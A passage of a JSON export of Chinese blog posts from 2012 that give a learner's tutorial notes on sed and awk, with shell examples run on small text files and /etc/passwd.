tabindex=\"2\"&gt;\n&lt;div id=\"gcaptcha\"&gt;&lt;/div&gt;  #验证码图片在这里\n&lt;input class=\"button\" id=\"lg\" value=\"登 录\" tabindex=\"3\"&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "April",
      "day": "13"
    }
  },
  {
    "id": 141,
    "title": "关于sed研究（二）",
    "category": "linux基础",
    "tags": [
      "sed"
    ],
    "url": "/archives/guanyusedyanjiuer/",
    "content": "<p><strong>1 正则表达式</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; sed -n '/^112/ p' test.txt  #'^'表示开头匹配，这里是开头是‘112’\n112,dongwm,dongwm.com\ndongwm@linux-dongwm:~&gt; sed -n '/com$/ p' test.txt #'$'表示结尾匹配 这里是匹配结尾是‘com’\n112,dongwm,dongwm.com\n113,ailll,ailll.com\n114,test,test.com</p>\n\n<p>dongwm@linux-dongwm:~&gt; sed -n '/do..wm\\.com/ p' test.txt  #使用‘.’匹配单个字符，\\.表示还是匹配‘.’\n112,dongwm,dongwm.com\ndongwm@linux-dongwm:~&gt; sed -n '/do.*/ p' test.txt  #使用‘*’匹配零个或者更多的字符\n112,dongwm,dongwm.com\ndongwm@linux-dongwm:~&gt; sed -n '/do.\\+/ p' test.txt  #使用‘\\+’匹配一个或者多个字符\n112,dongwm,dongwm.com\ndongwm@linux-dongwm:~&gt; sed -n '/do.\\?gwm/ p' test.txt  #使用‘\\?’匹配零个或者一个字符\n112,dongwm,dongwm.com\ndongwm@linux-dongwm:~&gt; sed -n '/[2-3]/ p' test.txt  #数字匹配使用[0-9]\n112,dongwm,dongwm.com\n113,ailll,ailll.com\ndongwm@linux-dongwm:~&gt; sed -n '/112\\|113/ p' test.txt  #这里有个选择(or) 使用‘\\|’\n112,dongwm,dongwm.com\n113,ailll,ailll.com</p>\n\n<p>dongwm@linux-dongwm:~&gt; cat test2.txt\n1\n12\n123\n1234\n12345\n123456\ndongwm@linux-dongwm:~&gt; sed -n '/^[0-9]\\{3,5\\}$/ p' test2.txt  #匹配符合匹配的书两，这里匹配行包含3－5个数字\n123\n1234\n12345\ndongwm@linux-dongwm:~&gt; sed -n '/112,\\b/ p' test.txt  #\\b表示单词（单词间距范围内）\n112,dongwm,dongwm.com\n<strong>2 直接修改文件</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; sed -i 's/dongwm/dongwm2/' test.txt  #使用‘-i’直接修改源文件\ndongwm@linux-dongwm:~&gt; cat test.txt\n112,dongwm2,dongwm.com\n113,ailll,ailll.com\n114,test,test.com</p>\n\n<p>dongwm@linux-dongwm:~&gt; sed -i.`date +%m%d%H%M` 's/dongwm/dongwm2/' test.txt  #姐姐修改源文件，但是会保存一个自定义命名的文件为源文件 ，这里使用‘.+时间（月日小时分）’的后缀\ndongwm@linux-dongwm:~&gt; cat test.txt\n112,dongwm2,dongwm.com\n113,ailll,ailll.com\n114,test,test.com\ndongwm@linux-dongwm:~&gt; cat test.txt.04161504\n112,dongwm,dongwm.com\n113,ailll,ailll.com\n114,test,test.com\n<strong>3 增加行</strong></p>\n\n<p>语法：</p>\n\n<p>sed '[address] a the-line-to-append' input-file\ndongwm@linux-dongwm:~&gt; sed '2 a 110,ccc,ccc.com' test.txt  #在指定行（这里是第二行后加一行）\n112,dongwm2,dongwm.com\n113,ailll,ailll.com\n110,ccc,ccc.com\n114,test,test.com\ndongwm@linux-dongwm:~&gt; sed '$ a 115,ddd,ddd.com' test.txt #在文件最后加一行\n112,dongwm2,dongwm.com\n113,ailll,ailll.com\n114,test,test.com\n115,ddd,ddd.com\ndongwm@linux-dongwm:~&gt; sed '/dongwm/ a 115,ddd,ddd.com' test.txt #在匹配行后面加一行\n112,dongwm2,dongwm.com\n115,ddd,ddd.com\n113,ailll,ailll.com\n114,test,test.com\n<strong>4 插入行</strong>\n语法：sed '[address] i the-line-to-insert' input-file\n这个和‘增加’语法一样，但是是在匹配行‘前’增加\n<strong>5 改变行</strong>\n语法：sed '[address] c the-line-to-insert' input-file\ndongwm@linux-dongwm:~&gt; sed '$ c 115,ccc,ccc.com' test.txt #把最后一行修改为，语法和增加一样，但是这个匹配行就没有了\n112,dongwm2,dongwm.com\n113,ailll,ailll.com\n115,ccc,ccc.com\n<strong>6 打印隐藏字符，比如\\t  $等</strong>\ndongwm@linux-dongwm:~&gt; sed -n l test.txt\n112,dongwm2,dongwm.com$\n113,ailll,ailll.com$\n114,test,test.com$\n<strong>7 打印行号</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; sed = test.txt\n1\n112,dongwm2,dongwm.com\n2\n113,ailll,ailll.com\n3\n114,test,test.com\ndongwm@linux-dongwm:~&gt; sed -n '/dongwm/ =' test.txt  #打印匹配行的行号\n1</p>\n\n<p><strong>8 字符翻译 比如将匹配字符转换成大写字母</strong>\ndongwm@linux-dongwm:~&gt; sed  'y/dongwm/DONGWM/' test.txt  #这里只有d，o，n，g，w，m这6个字母其他字母不变\n112,DONGWM2,DONGWM.cOM\n113,ailll,ailll.cOM\n114,test,test.cOM\n<strong>9 quit</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; sed  '2 q' test.txt  #打印每行，直到特定行退出 这里是2行\n112,dongwm2,dongwm.com\n113,ailll,ailll.com\n<strong>10 sed里面的grep</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; sed  -n 's/dongwm/&amp;/p' test.txt\n112,dongwm2,dongwm.com\ndongwm@linux-dongwm:~&gt; grep dongwm !$\ngrep dongwm test.txt\n112,dongwm2,dongwm.com</p>\n\n<p>dongwm@linux-dongwm:~&gt; sed  -n '/dongwm/ !p' test.txt  #取不匹配\n113,ailll,ailll.com\n114,test,test.com\ndongwm@linux-dongwm:~&gt; grep -v dongwm !$\ngrep -v dongwm test.txt\n113,ailll,ailll.com\n114,test,test.com\n<strong>11 sed里面的head\n</strong>sed -n '1,10 p' /etc/passwd\nsed '10 q' /etc/passwd\nsed '11,$ d' /etc/passwd\n或者</p>\n\n<p>head -10<strong>\n12\n</strong></p>\n\n<p>11</p>\n",
    "date": {
      "year": "2012",
      "month": "April",
      "day": "16"
    }
  },
  {
    "id": 142,
    "title": "关于sed研究（一）",
    "category": "linux基础",
    "tags": [
      "sed"
    ],
    "url": "/archives/guanyusedyanjiuyi/",
    "content": "<p><strong>1 sed语法和命令结构</strong></p>\n\n<p>sed [options] {sed-commands} {input-file}</p>\n\n<p>或者：</p>\n\n<p>sed [options] -f {sed-commands-in-a-file} {input-file}\n注：这里的sed-commands-in-a-file 其实就是把要执行的语句写在一个文件(这里是test.sed)中：</p>\n\n<p>dongwm@linux-dongwm:~&gt; cat test.sed\n/^dongwm/ p\n/^icinga/ p</p>\n\n<p>dongwm@linux-dongwm:~&gt; sed -n -f test.sed /etc/passwd\ndongwm:x:1000:100:dongwm:/home/dongwm:/bin/bash\nicinga:x:1001:100:icinga:/home/icinga:/bin/bash</p>\n\n<p>或者：</p>\n\n<p>sed [options] -e {sed-command-1} -e {sed-command-2}  #这里使用 '-e' 也就是执行相对应的语句,每个‘-e’执行结果都要返回，而不是符合全部'-e'的结果\n{input-file}\ndongwm@linux-dongwm:~&gt; sed -n -e '/^dongwm/ p' -e '/^icinga/ p' /etc/passwd\ndongwm:x:1000:100:dongwm:/home/dongwm:/bin/bash\nicinga:x:1001:100:icinga:/home/icinga:/bin/bash</p>\n\n<p>或者：</p>\n\n<p>sed [options] '{sed-command-1 sed-command-2}'  {input-file}  #使用多个执行语句用\"{}\"括起来,每个执行语句用';'隔开</p>\n\n<p>dongwm@linux-dongwm:~&gt; sed -n -e '{/^dongwm/ p;/^icinga/ p}' /etc/passwd  #\"-n\"表示打印时候去重复（我的理解）\ndongwm:x:1000:100:dongwm:/home/dongwm:/bin/bash\nicinga:x:1001:100:icinga:/home/icinga:/bin/bash</p>\n\n<p><strong>2 打印输出文件</strong></p>\n\n<p>这里有个文件：</p>\n\n<p>dongwm@linux-dongwm:~&gt; cat test.txt\n112,dongwm,dongwm.com\n113,ailll,ailll.com\n114,test,test.com\n例子:</p>\n\n<p>dongwm@linux-dongwm:~&gt; sed -n '2 p' !$  #打印第二行\nsed -n '2 p' test.txt\n113,ailll,ailll.com\ndongwm@linux-dongwm:~&gt; sed -n '1,2 p' test.txt  #打印某几行这里是start（1）－end（2）行\n112,dongwm,dongwm.com\n113,ailll,ailll.com\ndongwm@linux-dongwm:~&gt; sed -n '2,$ p' test.txt  #打印某行到最后一行 这里是第二行\n113,ailll,ailll.com\n114,test,test.com\ndongwm@linux-dongwm:~&gt; sed -n '1~2 p' test.txt  #这里‘~’修改了打印间隔，比如：1~2 匹配第一行，第三行（间隔为2）...；比如1~3 匹配第一行，第四行...\n112,dongwm,dongwm.com\n114,test,test.com\ndongwm@linux-dongwm:~&gt; sed -n '/dongwm/ p' test.txt  #模式匹配，匹配包含‘dongwm’的行\n112,dongwm,dongwm.com</p>\n\n<p>dongwm@linux-dongwm:~&gt; sed -n '/dongwm/,3 p' test.txt #模式匹配，匹配包含‘dongwm’的行，直到某一行的数据（这里是第3行）\n112,dongwm,dongwm.com\n113,ailll,ailll.com\n114,test,test.com\ndongwm@linux-dongwm:~&gt; sed -n '/dongwm/,/ailll/ p' test.txt #模式匹配，匹配包含‘dongwm’的行，直到包含‘ailll’的行\n112,dongwm,dongwm.com\n113,ailll,ailll.com\ndongwm@linux-dongwm:~&gt; sed -n '/dongwm/,+1 p' test.txt  #模式匹配，匹配包含‘dongwm’的行 然后再加某数值的行数（这里是1行）\n112,dongwm,dongwm.com\n113,ailll,ailll.com</p>\n\n<p><strong>3 删除行</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; sed '2 d' test.txt  #删除指定行，只是输出 源文件没有被操作\n112,dongwm,dongwm.com\n114,test,test.com</p>\n\n<p>删除的语句和上面打印的相同</p>\n\n<p>例子：</p>\n\n<p>sed '/^$/ d' test.txt  #删除所有行</p>\n\n<p>sed '/^#/ d' employee.txt  #删除所有注释行</p>\n\n<p><strong>4 将执行语句结果写入其他文件</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; sed -n 'w test2.txt' test.txt\ndongwm@linux-dongwm:~&gt; cat test2.txt\n112,dongwm,dongwm.com\n113,ailll,ailll.com\n114,test,test.com\n写入的语句和上面打印的相同，比如：</p>\n\n<p>dongwm@linux-dongwm:~&gt; sed -n '/dongwm/,2 w test2.txt' test.txt   #写入匹配行到第二行数据到text2.txt\ndongwm@linux-dongwm:~&gt; cat test2.txt\n112,dongwm,dongwm.com\n113,ailll,ailll.com\n<strong>5 替换</strong></p>\n\n<p>语法：sed '[address-range|pattern-range] s/original-\nstring/replacement-string/[substitute-flags]' inputfile\ndongwm@linux-dongwm:~&gt; sed  's/dongwm/dongwm2/' test.txt  #s 表示是要替换，这里只是替换第一个dongwm,如果sed  's/dongwm/dongwm2/g' test.txt 表示全文替换\n112,dongwm2,dongwm.com\n113,ailll,ailll.com\n114,test,test.com</p>\n\n<p>dongwm@linux-dongwm:~&gt; sed  '/com/s/dongwm/dongwm2/' test.txt  #喜爱指定匹配的行执行替换，这里是匹配行包括‘com’\n112,dongwm2,dongwm.com\n113,ailll,ailll.com\n114,test,test.com\ndongwm@linux-dongwm:~&gt; sed  's/dongwm/dongwm2/2' test.txt #替换全文中第几个符合匹配条件的匹配项，这里文件有2个，只替换第2个\n112,dongwm,dongwm2.com\n113,ailll,ailll.com\n114,test,test.com\ndongwm@linux-dongwm:~&gt; sed  's/com/com2/1' test.txt  #这里其实是匹配每行否和要求的匹配项\n112,dongwm,dongwm.com2\n113,ailll,ailll.com2\n114,test,test.com2\ndongwm@linux-dongwm:~&gt; sed  -n 's/dongwm/dongwm2/1p' test.txt  打印匹配行  －n 去重复\n112,dongwm2,dongwm.com\ndongwm@linux-dongwm:~&gt; sed  -n 's/dongwm/dongwm2/1w test2.txt' test.txt  #匹配替换后写入文件\ndongwm@linux-dongwm:~&gt; cat test2.txt\n112,dongwm2,dongwm.com\ndongwm@linux-dongwm:~&gt; sed  's/dongwm/dongwm2/i' test.txt #替换被匹配字符串忽略大小写，比如 Dongwm</p>\n\n<p>dongwm@linux-dongwm:~&gt; cat test.txt   #这个文件记录了2个创建的文件的名字\ntest1\ntest2\ndongwm@linux-dongwm:~&gt; !sed\nsed 's/^/ls -l /e' test.txt   #e 主要是替换后直接执行\n-rw-r--r-- 1 dongwm users 2763  4月 16 13:53 test1\n-rw-r--r-- 1 dongwm users 0  4月 16 13:53 test2\ndongwm@linux-dongwm:~&gt; sed -n 's/dongwm/dongwm2/gipw text2.txt' test.txt  #多操作g i p w\n112,dongwm2,dongwm2.com\ndongwm@linux-dongwm:~&gt; cat test2.txt\n112,dongwm2,dongwm.com\ndongwm@linux-dongwm:~&gt; cat test.txt\nreading /usr/local/bin directory</p>\n\n<p>除了使用反斜杠外 行可以使用一下字串进行快捷操作：\ndongwm@linux-dongwm:~&gt; sed 's^/usr/local/bin^/usr/bin^' test.txt\nreading /usr/bin directory\ndongwm@linux-dongwm:~&gt; sed 's@/usr/local/bin@/usr/bin@' test.txt\nreading /usr/bin directory\ndongwm@linux-dongwm:~&gt; sed 's!/usr/local/bin!/usr/bin!' test.txt\nreading /usr/bin directory\ndongwm@linux-dongwm:~&gt; sed 's|/usr/local/bin|/usr/bin|' test.txt\nreading /usr/bin directory\ndongwm@linux-dongwm:~&gt; sed '{s/dongwm/dongwm2/;s/ailll/ailll2/}' test.txt  多条件替换，之间用‘；’\n112,dongwm2,dongwm.com\n113,ailll2,ailll.com\n114,test,test.com\ndongwm@linux-dongwm:~&gt; sed 's/^[0-9][0-9][0-9]/[&amp;]/g' test.txt #替换文件中数字，在数字外面加'[]'\n[112],dongwm,dongwm.com\n[113],ailll,ailll.com\n[114],test,test.com\ndongwm@linux-dongwm:~&gt; sed 's/^.*/&lt;&amp;&gt;/' test.txt #替换每行，在每行内容外加'&lt;&gt;'\n&lt;112,dongwm,dongwm.com&gt;\n&lt;113,ailll,ailll.com&gt;\n&lt;114,test,test.com&gt;</p>\n\n<p>dongwm@linux-dongwm:~&gt; sed 's/\\([^,]*\\).*/\\1/g' test.txt #匹配组，这里匹配的是 第一个‘，’前的内容 \\1表示第一个匹配组\n112\n113\n114\ndongwm@linux-dongwm:~&gt; echo 'Dong Wei Ming' |sed 's/\\(\\b[A-Z]\\)/\\(\\1\\)/g'  #匹配每个词的大写字母，给他加个括号\n(D)ong (W)ei (M)ing</p>\n\n<p>dongwm@linux-dongwm:~&gt; cat !$\ncat test.txt\n1\n12\n123\n1234\n12345\n123456\ndongwm@linux-dongwm:~&gt; sed 's/\\(^\\|[^0-9.]\\)\\([0-9]\\+\\)\\([0-9]\\{3\\}\\)/\\1\\2,\\3/g' test.txt  #这里有三个匹配组，所以有 \\1,\\2\\3\n1\n12\n123\n1,234\n12,345\n123,456\ndongwm@linux-dongwm:~&gt; cat !$\ncat test.txt\n112,dongwm,dongwm.com\n113,ailll,ailll.com\n114,test,test.com\ndongwm@linux-dongwm:~&gt; sed 's/\\([^,]*\\),\\([^,]*\\),\\([^,]*\\).*/\\1,\\3/g' test.txt  #这里根据‘，’分割出三个匹配组，然后替换把1，2，3组替换为1，3组\n112,dongwm.com\n113,ailll.com\n114,test.com\ndongwm@linux-dongwm:~&gt; sed -n 's/dongwm/\\udongwm/p' test.txt  #\\u会让挨着他后面的那个字母（这里是d）变成大写\n112,Dongwm,dongwm.com\ndongwm@linux-dongwm:~&gt; sed -n 's/dongwm/\\Udongwm/p' test.txt  #\\U会让挨着他后面的所有字母都变成大写</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "April",
      "day": "16"
    }
  },
  {
    "id": 143,
    "title": "关于sed研究（三）",
    "category": "linux基础",
    "tags": [
      "sed"
    ],
    "url": "/archives/guanyusedyanjiuee/",
    "content": "<p><strong>1 存储空间</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; cat test.txt\ndongwm\nADMIN 1\nailll\nAILLL\nccc\nADMIN 2</p>\n\n<p>dongwm@linux-dongwm:~&gt; sed -n -e 'x;n' -e '/ADMIN/{x;p}' test.txt  #临时存储匹配空间的前一行，x;n 转换匹配空间为临时空间，</p>\n\n<p>#读取下一行；/ADMIN/{x;p}，如果这个行的下一行匹配，那么输出临时空间\ndongwm\nccc\ndongwm@linux-dongwm:~&gt; sed -n -e '/ADMIN/!h' -e '/ADMIN/{x;p}' test.txt  #使用‘h’会让匹配空间和临时空间都缓存这个行，所以使用‘’\ndongwm\nccc</p>\n\n<p>dongwm@linux-dongwm:~&gt; sed -n -e '/ADMIN/!h' -e '/ADMIN/{H;x;p}' test.txt #使用‘H’模式空间没有改变，但是临时空间将包含：下一行\\n这一行\ndongwm\nADMIN 1\nccc\nADMIN 2\ndongwm@linux-dongwm:~&gt; sed -n -e '/ADMIN/!h' -e '/ADMIN/{H;x;s/\\n/:/;p}' test.txt #这个和上面的意思一样，但是将'\\n'替换成了':'\ndongwm:ADMIN 1\nccc:ADMIN 2\ndongwm@linux-dongwm:~&gt; sed -n -e '/ADMIN/!h' -e '/ADMIN/{g;p}' test.txt  #使用'g'，模式空间改成了下一行，但是临时空间不变，也就是说，</p>\n\n<p>#他从临时空间取到这一行，再把他放在模式空间\ndongwm\nccc\ndongwm@linux-dongwm:~&gt; sed -n -e '/ADMIN/!h' -e '/ADMIN/{x;G;s/\\n/:/;p}' test.txt #简单的说，临时空间不变，模式空间不仅包含以前的行，再添加了临时空间的行\ndongwm:ADMIN 1\nccc:ADMIN 2<strong></strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; sed -e '{N;s/\\n/:/}' test.txt  #‘N’表示不仅打印这个模式空间行，还加‘\\n’再加文件的下一行，在这里使用':'替换了‘\\n’\ndongwm:ADMIN 1\nailll:AILLL\nccc:ADMIN 2\ndongwm@linux-dongwm:~&gt; sed -e '=' test.txt | sed -e '{N;s/\\n/:/}' #首先打印行号，然后把行号和这行打印在一行\n1:dongwm\n2:ADMIN 1\n3:ailll\n4:AILLL\n5:ccc\n6:ADMIN 2</p>\n\n<p>dongwm@linux-dongwm:~&gt; sed -n -e 'N' -e '/ADMIN/p' test.txt\ndongwm\nADMIN 1\nccc\nADMIN 2\ndongwm@linux-dongwm:~&gt; sed -n -e 'N' -e '/ADMIN/P' test.txt#这个‘P’会打印多行中的第一行\ndongwm\nccc\ndongwm@linux-dongwm:~&gt; cat !$\ncat test.txt\ndongwm @test1@\nADMIN 1 @test2@\nailll\nAILLL @test@\nccc\nADMIN 2</p>\n\n<p>dongwm@linux-dongwm:~&gt; sed -n -e '/@/{/@.*@/{s/@.*@//;p;D}}' test.txt  #这个不好懂 请看下面的拆解\ndongwm\nAILLL\nccc\ndongwm@linux-dongwm:~&gt; sed -n -e '/@/p' test.txt  #打印匹配行\ndongwm @test1@\nADMIN 1 @test2@\nAILLL @test@\ndongwm@linux-dongwm:~&gt; sed -n -e '/@/{/@.*@/p}' test.txt  ＃加了‘N’这样会在模式空间加下面的一行，但是假如下一行也是模式空间就没有下一行\ndongwm @test1@\nADMIN 1 @test2@\nAILLL @test@\nccc\ndongwm@linux-dongwm:~&gt; sed -n -e '/@/{N;/@.*@/{s/@.*@//;p;D}}' test.txt   #‘p’打印，‘D’是删除模式空间\ndongwm\nAILLL\nccc\ndongwm@linux-dongwm:~&gt; sed -e 'h;n;H;x;s/\\n/:/;/ADMIN/!b end;s/^/*/;:end' test.txt #看不懂还是看以下的拆解\ndongwm\n*dongwm:ADMIN 1\nailll\nailll:AILLL\nccc\n*ccc:ADMIN 2\ndongwm@linux-dongwm:~&gt; sed -e 'h;n;H;x;s/\\n/:/' test.txt  #这个很好懂，临时空间包含这行和下一行，'\\n'替换成了‘:’\ndongwm\ndongwm:ADMIN 1\nailll\nailll:AILLL\nccc\nccc:ADMIN 2\ndongwm@linux-dongwm:~&gt; sed -e 'h;n;H;x;s/\\n/:/;/ADMIN/!b end;s/^/*/;:end' test.txt #匹配行，使用‘b’，使用这标签，把行首添加'*'\ndongwm\n*dongwm:ADMIN 1\nailll\nailll:AILLL\nccc\n*ccc:ADMIN 2\ndongwm@linux-dongwm:~&gt; sed -e 'h;n;H;x;s/\\n/:/;:repeat;/ADMIN/s/^/*/;/\\*\\*\\*/!t repeat' test.txt #使用't'以前的替代成功，跳转到行标签标记，并继续执行，否则继续正常执行流程。\ndongwm                                                                                                                                #如果发现模式空间行没有‘＊＊＊’并且赏个替换成功，就会执行\n***dongwm:ADMIN 1\nailll\nailll:AILLL\nccc\n***ccc:ADMIN 2</p>\n",
    "date": {
      "year": "2012",
      "month": "April",
      "day": "17"
    }
  },
  {
    "id": 144,
    "title": "关于awk研究（二）",
    "category": "awk",
    "tags": [
      "awk"
    ],
    "url": "/archives/guanyuawkyanjiuer/",
    "content": "<p><strong>1 变量</strong></p>\n\n<p>注：假如有一些需要设置的变量，建议在BEGIN块里面</p>\n\n<p>dongwm@linux-dongwm:~&gt; cat test.txt\n112,dongwm,dongwm.com,1120\n113,ailll,ailll.com,1130\n114,ccc,ccc.com,1140</p>\n\n<p>dongwm@linux-dongwm:~&gt; cat test.awk\nBEGIN {\nFS=\",\";\ntotal=0;\n}\n{\nprint $2 \"'s num is: \" $4;\ntotal+=$4\n}\nEND {\nprint \"---\\nTotal num = \"total;\n}\ndongwm@linux-dongwm:~&gt; awk -f test.awk test.txt\ndongwm's num is: 1120\nailll's num is: 1130\nccc's num is: 1140\n---\nTotal num = 3390  #我曾经把语句没有放在外面，但是计算失败。。。一直没研究出原因\n<strong>2 运算符</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; awk -F, '{print ++$4}' test.txt  #自增长\n1121\n1131\n1141\ndongwm@linux-dongwm:~&gt; awk -F ':' '$NF ~ /\\/bin\\/bash/ { n++ }; END { print n }' /etc/passwd  #计算包含shell的用户数\n14\n<strong>3 算术运算符</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; awk 'NR %2==0' test.txt\n113,ailll,ailll.com,1130\n<strong>4  字符串运算</strong>\ndongwm@linux-dongwm:~&gt; cat test.awk\nBEGIN {\nFS=\",\";\nOFS=\",\";\nstring1=\"Audio\";\nstring2=\"Video\";\nnumberstring=\"100\";\nstring3=string1 string2;\nprint \"Concatenate string is:\" string3;\nnumberstring=numberstring+1;\nprint \"String to number:\" numberstring;\n}\ndongwm@linux-dongwm:~&gt; awk -f test.awk  #因为在BEGIN里面，是在操作文件前执行，所以可以不指定文件\nConcatenate string is:AudioVideo\nString to number:101\n<strong>5 比较运算符</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; awk -F \",\" '$4 &lt;= 1130 &amp;&amp; $4&gt;=1121' test.txt\n113,ailll,ailll.com,1130\ndongwm@linux-dongwm:~&gt; awk -F \",\" '$1 == 113 {print $2}' test.txt  匹配$1等于113的行\nailll\ndongwm@linux-dongwm:~&gt; awk -F \",\" '$1 &lt; 113 || $4 &lt;= 1120' test.txt\n112,dongwm,dongwm.com,1120\ndongwm@linux-dongwm:~&gt; awk -F ':' '$3 &gt; maxuid { maxuid=$3; maxline=$0 }; \\\n&gt; END { print maxuid, maxline }' /etc/passwd  #这是一个很巧妙的方法找到uid最大的那一行数据\n65534 nobody:x:65534:65533:nobody:/var/lib/nobody:/bin/bash\ndongwm@linux-dongwm:~&gt; awk -F ':' '$3&gt;=100 &amp;&amp; $NF ~ /\\/bin\\/bash/' /etc/passwd   #获取uid大于100 并且 shell是 /bin/bash的行  '~'表示匹配\nnobody:x:65534:65533:nobody:/var/lib/nobody:/bin/bash\nsuse-ncc:x:106:109:Novell Customer Center User:/var/lib/YaST2/suse-ncc-fakehome:/bin/bash\ndongwm:x:1000:100:dongwm:/home/dongwm:/bin/bash\nicinga:x:1001:100:icinga:/home/icinga:/bin/bash</p>\n\n<p><strong>6 正则匹配</strong>\n以下2句意思是一样的：</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk -F \":\" '$1 == \"dongwm\"' /etc/passwd\ndongwm:x:1000:100:dongwm:/home/dongwm:/bin/bash\ndongwm@linux-dongwm:~&gt; awk -F \":\" '$1 ~ \"dongwm\"' /etc/passwd\ndongwm:x:1000:100:dongwm:/home/dongwm:/bin/bash\n<strong>7 awk的条件语句</strong></p>\n\n<p>语法：if (conditional-expression)\naction\n或者if (conditional-expression)\n{\naction1;\naction2;\n}\n例子：</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk -F \",\" '{ if ($4 &lt;= 1130) print \"Only\",$4,\"qty of\",$2, \"is available\"; }' test.txt\nOnly 1120 qty of dongwm is available\nOnly 1130 qty of ailll is available</p>\n\n<p>语法：</p>\n\n<p>if (conditional-expression)\naction1\nelse\naction2\n或者：conditional-expression ? action1 : action2 ;</p>\n\n<p>dongwm@linux-dongwm:~&gt; cat test.awk\nBEGIN {\nFS=\",\";\n}\n{\nif ( $4 &lt;= 1130 )\nprint \"Buy More: Order\", $2, \"immediately!\"\nelse\nprint \"Sell More: Give discount on\", $2,\n\"immediately!\"\n}</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk -f test.awk test.txt\nBuy More: Order dongwm immediately!\nBuy More: Order ailll immediately!\nSell More: Give discount on ccc immediately!\n语法：</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk 'ORS=NR%2?\",\":\"\\n\"' test.txt\n112,dongwm,dongwm.com,1120,113,ailll,ailll.com,1130\n114,ccc,ccc.com,1140,dongwm@linux-dongwm:~&gt;</p>\n\n<p><strong>8 awk的循环语句</strong>\n语法：</p>\n\n<p>while(condition)\nactions  #假如第一次执行错误就会失败</p>\n\n<p>例子：\ndongwm@linux-dongwm:~&gt; awk 'BEGIN { while (count++&lt;50) string=string \"x\"; print string }'\nxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n语法：</p>\n\n<p>do\naction\nwhile(condition)  #就算第一次失败，也会执行一次</p>\n\n<p>语法：</p>\n\n<p>for(initialization;condition;increment/decrement)\nactions\ndongwm@linux-dongwm:~&gt; echo \"1 2 3 4\" | awk '{ for (i = 1; i &lt;= NF; i++) total =total+$i }; END { print total }'\n10</p>\n\n<p>9 break和Continue\ndongwm@linux-dongwm:~&gt; awk 'BEGIN{x=1;while(x&lt;=10){if(x==5){x++;break;}print \"Value of x\",x;x++;}}'\nValue of x 1\nValue of x 2\nValue of x 3\nValue of x 4\ndongwm@linux-dongwm:~&gt; awk 'BEGIN{x=1;while(x&lt;=10){if(x==5){x++;continue;}print \"Value of x\",x;x++;}}'\nValue of x 1\nValue of x 2\nValue of x 3\nValue of x 4\nValue of x 6\nValue of x 7\nValue of x 8\nValue of x 9\nValue of x 10<strong></strong></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "April",
      "day": "18"
    }
  },
  {
    "id": 145,
    "title": "关于awk研究（一）",
    "category": "awk",
    "tags": [
      "awk"
    ],
    "url": "/archives/guanyuawkyanjiuyi/",
    "content": "<p>前言：我想sed是对于行操作，而awk算是对于列操作</p>\n\n<p><strong>1 基本语法</strong></p>\n\n<p>awk -Fs '/pattern/ {action}' input-file\n或者</p>\n\n<p>awk -Fs '{action}' intput-file\n其中：－F是字段分割符，没有指定的话就是空字符</p>\n\n<p>/pattern/ 假如不存在这个模式匹配，指全文</p>\n\n<p>{action}是要执行的活动</p>\n\n<p>比如：awk -F: '/dongwm/ {print $1}' /etc/passwd 就是寻找 /etc/passwd匹配‘dongwm’的行，然后的操作（action）是用':'分割，打印第一列</p>\n\n<p>或者</p>\n\n<p>awk -Fs -f myscript.awk input-file  指定一个文件 和sed类似\n<strong>2 awk结构（BEGIN, body, END）</strong>\n1 BEGIN  它可以初始化变量，这个结构是可选的</p>\n\n<p>语法：BEGIN { awk-commands }\n2 body 也就是awk的主体</p>\n\n<p>语法：/pattern/ {action}\n3 END 结束块</p>\n\n<p>语法：END { awk-commands } 也是可选的\n例子：</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk 'BEGIN { FS=\":\";print \"---header---\" } /dongwm/{print $1} END { print \"---footer---\"}' /etc/passwd\n---header---                              #这个例子，首先执行BEGIN里面的，设定分割符‘:’，打印header，然后匹配行打印分割的第一段，但后执行END，打印footer\ndongwm\n---footer---\n或者：</p>\n\n<p>dongwm@linux-dongwm:~&gt; cat test.awk\nBEGIN { FS=\":\";print \"---header---\" }\n/dongwm/{print $1}\nEND { print \"---footer---\"}\ndongwm@linux-dongwm:~&gt; awk -f test.awk /etc/passwd\n---header---\ndongwm\n---footer---</p>\n\n<p>例子2：</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk -F: 'BEGIN { print \"UID\"} { print $3 }' /etc/passwd  #awk 的打印都是‘print’\nUID\n25\n103\n1\n2\n102\n40\n12\n107\n109\n<strong>3 awk处理多个文件</strong>\ndongwm@linux-dongwm:~&gt; awk 'BEGIN { FS=\":\";print \"---header---\" } /dongwm/ {print $1} END { print \"---footer---\"}' /etc/passwd /etc/group\n---header---\ndongwm\nvideo   #这个video组包含dongwm\n---footer---\n<strong>4 print(打印功能)</strong>\n先看一个例子</p>\n\n<p>dongwm@linux-dongwm:~&gt; cat test.txt\n112,dongwm,dongwm.com\n113,ailll,ailll.com\n114,ccc,ccc.com\ndongwm@linux-dongwm:~&gt; awk -F ',' 'BEGIN \\\n{ print \"-------------\\nName\\tTitle\\n-------------\"} \\\n{ print $2,\"\\t\",$3;} \\\nEND { print \"-------------\"; }' test.txt  注：你也是格式化文件了\n-------------\nName    Title\n-------------\ndongwm      dongwm.com\nailll      ailll.com\nccc      ccc.com\n-------------\n<strong>5 模式匹配</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; awk -F 